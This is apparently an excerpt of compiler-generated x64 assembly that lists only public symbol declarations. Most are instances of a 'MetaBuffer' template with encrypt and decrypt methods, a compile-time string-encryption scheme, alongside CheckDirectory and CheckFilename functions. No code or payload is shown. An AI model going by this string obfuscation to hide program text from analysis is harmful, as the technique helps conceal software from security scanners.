PUBLIC	?decrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
PUBLIC	?CheckDirectory@@YAHPEB_W@Z			; CheckDirectory
PUBLIC	??0?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<47,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
PUBLIC	??0?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<89,2,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
PUBLIC	??0?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
PUBLIC	?isDecrypted@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<2,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	??0?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<113,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
PUBLIC	??0?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
PUBLIC	??0?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
PUBLIC	??0?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >
PUBLIC	?isDecrypted@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt
PUBLIC	??0?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<37,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	??0?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<67,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
PUBLIC	??0?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAA@PEBE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEBA_NXZ ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAAPEBDXZ ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z ; MetaBuffer<61,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::decrypt
PUBLIC	??0?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z ; MetaBuffer<47,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt
PUBLIC	?CheckFilename@@YAHPEB_W@Z			; CheckFilename
PUBLIC	??0?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
PUBLIC	?isDecrypted@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	??0?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	??0?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	??0?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
